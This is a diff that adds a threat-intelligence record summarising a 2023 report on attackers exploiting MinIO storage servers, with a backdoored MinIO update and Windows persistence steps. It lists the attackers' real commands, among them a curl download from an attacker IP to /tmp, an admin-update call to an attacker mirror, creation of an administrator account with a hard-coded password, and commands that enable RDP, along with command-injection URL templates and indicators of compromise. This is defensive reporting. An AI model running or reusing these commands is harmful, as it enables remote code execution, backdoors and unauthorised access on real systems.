@@ -1,0 +1,110 @@
+title: 'New Attack Vector In The Cloud: Attackers caught exploiting Object Storage
+  Services'
+description: A threat actor exploited vulnerable MinIO instances to achieve remote
+  code execution, deployed an embedded backdoor via a malicious MinIO binary update,
+  and conducted post-compromise activities including system profiling, network reconnaissance,
+  and Windows account creation.
+attribution: ''
+malware_families:
+- evil_minio
+- EvilMinIO
+cves:
+- CVE-2023-28432
+- CVE-2023-28434
+ttps:
+  processes:
+  - minio
+  - curl
+  - wget
+  - bitsadmin
+  - mc
+  command_lines:
+  - mc alias set [ALIAS] [URL_TARGET_MINIO] [ACCESS_KEY] [SECRET_KEY]
+  - mc alias list
+  - mc admin update [ALIAS] [MIRROR_URL] --yes
+  - curl 5.183.95.88/host/[HOST_ID] -o /tmp/hsh /tmp/h &
+  - net user support QWEqwe123!!! /add
+  - net localgroup "Remote Desktop Users" support /add
+  - net localgroup "Administrators" support /add
+  - reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+    /t REG_DWORD /d 0 /f
+  - netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP
+    localport=3389 action=allow
+  powershell: []
+  scripts:
+  - adduser.bat
+  - winhttpjs.bat
+  - node.bat
+  - scan.py
+  - networks.py
+  - pinger.py
+  registry_keys:
+  - HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server
+  image_loads: []
+  network_connections:
+  - curl -> 5.183.95[.]88:80
+  - curl -> 5.183.95[.]88:443
+  - curl -> 5[.]183[.]95[.]88:80
+  file_activity:
+  - /usr/local/bin/minio
+  - /tmp/hsh
+  - /tmp/h
+  - scan_linux
+  - networks_linux
+  - shell.php
+  - adduser.bat
+  - winhttpjs.bat
+  - node.bat
+  - scan.py
+  - networks.py
+  - pinger.py
+  - minio
+  - h
+  - s
+  persistence:
+  - Replacement of legitimate MinIO binary at /usr/local/bin/minio with backdoored
+    "evil_minio" binary via the MinIO admin update command pointing to attacker-controlled
+    MIRROR_URL
+  - Windows account creation adding users "support" and "servicemanager" to Remote
+    Desktop Users and Administrators groups
+  - Registry modification to enable Remote Desktop connections via HKLM\SYSTEM\CurrentControlSet\Control\Terminal
+    Server fDenyTSConnections=0
+  - Windows Firewall rule added to allow RemoteDesktop on TCP port 3389
+  - EvilMinIO embedded backdoor replacing legitimate MinIO binary via malicious update
+    process
+  - Create local user account "support" and add to Remote Desktop Users and Administrators
+    groups
+  - Enable RDP via registry key fDenyTSConnections set to 0
+  - Allow RDP through firewall via netsh rule on port 3389
+  - Web shell (shell.php) deployed on C2 server
+  process_relations: []
+iocs:
+  hashes:
+  - 1ef7419804e401fbb3860862c2b2fbc1ec3c4650fe24fb44f787f81acf6ad65b
+  - b14a23d0d77a45f4df4889b0c2d239fb118f9d16f944571a8b4d08603d16fb41
+  - 9698d561de233038cf922b0de4a0bbb8e5723c800b4bc04c7ac82d92cb715dfd
+  - 42aaacf6871108a45e1ae8ede15bc7cdcb9cf9ede067059524ba8d3b8928e91c
+  - fc7909c24b2bb7f42648c605deacb3ae4f9574b95a562dd165e5e9aca2cc7d74
+  - 0e084eb83954a090d83730b157f20549cf90b9d0206f5fd0bbcff009788eeafd
+  - eadde565b44e35608447b056761ba172b608b796418ab1244607dc17d21f05e3
+  - d56c63cc53ed72a879f224ab85019db5fc2c30e8f193c1147975d46e3f5d913a
+  - 9e1a2a068af2524d2abc48c1edf46de8cfa3329d3688164db5969bc1914377fc
+  - d4cf68e351992fc32021c75820f7d2a858796dd9dc245b7fbbf2cef8656081b2
+  - 6b46cf38c45ad81dfcbbd77a1b196c5dea147088f6dab1b1920a508d61bb03ed
+  - fffa85e27836fd556a06660ac0ad76a35ef02687652a81194821c538e847d58f
+  ip_addresses:
+  - 5.183.95[.]88
+  - 5[.]183[.]95[.]88
+  domains:
+  - api[.]timeinfo[.]org
+  - codeclou[.]io
+  urls:
+  - hxxp://vulnerable.minio.server/?alive=[CMD_TO_EXECUTE]
+  - hxxp://vulnerable.minio.server/anything?alive=[CMD_TO_EXECUTE]
+authors:
+- Felipe Duarte
+- Ido Naor
+- Felipe Duarte, Security Joes
+reference: https://www.securityjoes.com/post/new-attack-vector-in-the-cloud-attackers-caught-exploiting-object-storage-services
+date_of_publication: September 04, 2023
+file_creation_date: May 22, 2026
